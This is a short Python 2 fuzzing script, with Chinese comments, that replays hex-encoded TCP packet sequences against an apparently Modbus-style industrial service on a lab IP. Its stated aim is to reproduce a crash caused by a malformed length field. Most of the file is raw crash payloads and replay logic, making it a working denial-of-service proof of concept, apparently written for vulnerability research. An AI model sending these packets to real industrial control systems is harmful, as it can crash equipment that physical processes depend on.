#!/usr/bin/python
# -*- coding: UTF-8 -*-

from cpf.fuzzer.TCPFuzzer import TCPFuzzer
from cpf.misc.utils import *


def add_header(data):
    header = "\xaa\xbb\xff\xff" + p16(len(data) + 1, big_endian=True) + "\xde" + "\x00\x64"
    return header + data


if __name__ == '__main__':

    fuzzer = TCPFuzzer(host="192.168.245.135", port=27700,
                       nomal_trans_conf="../conf/seigmodbus/",
                       logseq_count=4, interval=0.02)

    # print fuzzer.is_alive()
    # exit(0)

    relay = True

    if not relay:
        fuzzer.fuzz(mutate_max_count=10)
    else:

        #  由于 协议格式里面有 size 域， 所以当一个异常的 size 包发过去
        # 服务端会需要更多的数据包，才能继续运行触发漏洞
        seqs = [[{"recv": "aabbff",
                  "send": "aabb00ff0038de0164a26d61616161616161616161616161619e6161616161616161619b556161616161616161616161616161619e6161616161616161619b5561616161616141616161616161616161616194f94661616161ffff38de012020202020202020208080808080806141616161616161616161616194f94661616161ffff38df01202020202020201f208080808080808080806161616161"}],
                [{"recv": "aabbff",
                  "send": "aabbffff0038de006461616138de5064616161616161616161220720202020202020202020202020202020202020202020810000002020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202f465494cb0e6161616161"}],
                [{"recv": "aabbff",
                  "send": "aabb7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f02b3a94c9b99766161616161616161616161616161619e7ae3be6891029164342ea4fefefefefefefe381117d17527ba166a94a0f9fbfe9f177963b5f110889036e63b70d162083f1d619e6161bb7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f02b3a94c9b99766161616161616161616161"}],
                [{"recv": "aabbff",
                  "send": "d03d2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020f4bce598256161202020f4bce59825616161606161616161"}]]

        #

        crash_seqs = [{'recv': 'aabbff',
                       'send': 'aabbffff0038de006461616138de5064616161616161616161220720202020202020202020202020202020202020202020810000002020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202f465494cb0e6161616161'}]

        if fuzzer.check_vuln(crash_seqs, wait_time=2):
            print "漏洞复现"

        # exit(0)

        for seq in seqs:
            sleep(0.6)
            if fuzzer.check_vuln(seq):
                print "请收下触发异常的用例： "
                print seq
                exit(0)
